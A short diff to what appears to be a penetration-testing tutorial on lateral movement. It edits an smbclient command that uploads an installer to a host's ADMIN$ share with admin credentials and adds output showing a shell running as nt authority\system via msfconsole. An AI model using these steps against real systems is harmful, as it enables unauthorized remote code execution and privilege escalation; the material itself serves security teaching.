@@ -26,7 +26,7 @@ Sharename       Type      Comment
 ...
 
 
-$ smbclient -c "put <msi_name>.exe -U admin -W test.com '//iis.test.com/ADMIN$'
+$ smbclient -c "put <msi_name>.msi -U admin -W test.com '//iis.test.com/ADMIN$'
 ```
 {% endcode %}
 
@@ -77,7 +77,8 @@ After executing the above commands, we should receive a connection on the `msfco
 
 {% code title="msfconsole" overflow="wrap" %}
 ```powershell
-C:\> ...
+C:\> whoami
+nt authority\system
 ```
 {% endcode %}
 
